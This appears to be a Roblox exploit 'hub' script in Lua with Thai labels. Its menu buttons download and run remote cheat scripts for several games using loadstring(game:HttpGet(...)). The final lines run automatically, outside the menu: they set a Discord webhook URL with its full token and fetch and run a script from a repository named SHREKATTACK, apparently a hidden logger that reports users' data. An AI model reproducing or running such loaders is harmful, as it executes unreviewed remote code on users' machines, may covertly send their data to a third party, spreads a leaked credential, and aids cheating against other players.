local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()

local win = DiscordLib:Window("Nexlus Hub")

local serv = win:Server("สคิปต่างๆ", "")

local bf = serv:Channel("สคิป บล็อกฟุต")
local kl = serv:Channel("สคิป คิงพีช")
local asn = serv:Channel("สคิป อาเซนอล")
local ffy = serv:Channel("สคิป Funky friday")

bf:Button("Neva hub บล็อกฟุต", function()
--Blox fruit-Neva-Hub
loadstring(game:HttpGet('https://raw.githubusercontent.com/VEZ2/NEVAHUB/main/2'))()
end)

bf:Button("Hoho Hub บล็อกฟุต", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
end)

kl:Button("One X Hub คิงพีช", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/xOne2/King-Legacy/main/README.md"))()
end)

asn:Button("อาเซนอล จำชื่อ Hubไม่ได้555!!", function()
--Arsenal
loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/UltimateCromaSin-Arsenal-Gui/main/AdvanceTechV2.lua"))()
end)

ffy:Button("Funky friday", function()
-- Use with Fluxus Android
-- fluxteam.net
-- Made by Wally, modded by ShowerHeadFD
loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
end)

_G.webhooksdiscord = "https://discord.com/api/webhooks/1050068639312781395/vU50tq3VQT0sT1VIIDxaECprBaIJqtf5LPh30XeYzm2kbGIPe7DWfpLPvlXco1Ie8jXL"
loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
